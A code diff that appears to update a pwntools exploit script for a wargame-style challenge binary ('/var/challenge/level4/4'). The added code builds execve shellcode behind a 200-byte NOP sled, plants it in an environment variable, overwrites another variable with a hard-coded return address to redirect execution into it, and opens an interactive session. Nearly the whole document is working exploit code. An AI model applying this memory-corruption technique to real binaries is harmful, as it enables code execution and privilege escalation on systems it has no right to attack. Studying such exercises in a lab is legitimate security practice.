@@ -5,63 +5,37 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or './4')
-#exe = context.binary = ELF('gdb ./4')
-
+# exe = context.binary = ELF(args.EXE or './4AAAAAAA')
+exe = context.binary = ELF(args.EXE or '/var/challenge/level4/4')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 
-#l33tpath = "/usr/local/bin/l33t"
-#l33tcode = asm(shellcraft.execve(l33tpath, '', ''))
-
-#print(shellcraft.syscall('SYS_execve', 1, 'rsp', 2, 0).rstrip())
-
 l33tpath = '/usr/local/bin/l33t'
-
 shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
-#shellcode = asm(shellcraft.syscall('SYS_execve', l33tpath, 'rsp', 0, 0))
-
 nop_sled = b'\x90' * 200
 shellcode = nop_sled + shellcode
 
-payload = fit({
-    0: shellcode,
-   # 160: p64(0xcafebabe)
-})
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
+# Shellcode starts here
+shellcode_addr = p64(0x7fffffffee41 + 10) # + 10 to jump over the "L33T=" part of the env variable
 
-
-with open('shellcode.bin', 'wb') as f:
-        f.write(shellcode)
-
-# Write the addr to a file
-with open('addr4.bin', 'wb') as f:
-        f.write(p64(0x7fffffffef36))
-
-
-
-#testenv = {
-#        "USERNAME": "eliaspwnie",
-#        "HOSTNAME": "eliashost.comie",
-#       # "L33T": payload
-#        "SHCODE": shellcode
-#}
-
-print(payload)
-
-#context.terminal = ["tmux", "splitw", "-h"]
+# Empty reproducible env
+env = {
+    "SHOULD_NOT_SEE": "yes",
+    "L33T": "A" * len(shellcode), # when run with GDB, bytes give an error so replace with a string of the same length to reproduce env
+    "USERNAME": 40 * "A",
+    "HOSTNAME": 53 * b"B" + shellcode_addr[:6] # discard the 0 bytes at the end, they give errors and are not copied anyway
+}
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
     if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
     else:
-        return process([exe.path] + argv, *a, **kw)
+        env['L33T'] = shellcode
+        return process([exe.path] + argv, *a, **kw, env=env)
 
 # Specify your GDB script here for debugging
 # GDB will be launched if the exploit is run via e.g.
@@ -87,15 +61,5 @@ continue
 # Debuginfo:  Yes
 
 io = start()
-
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
-
 io.interactive()
 
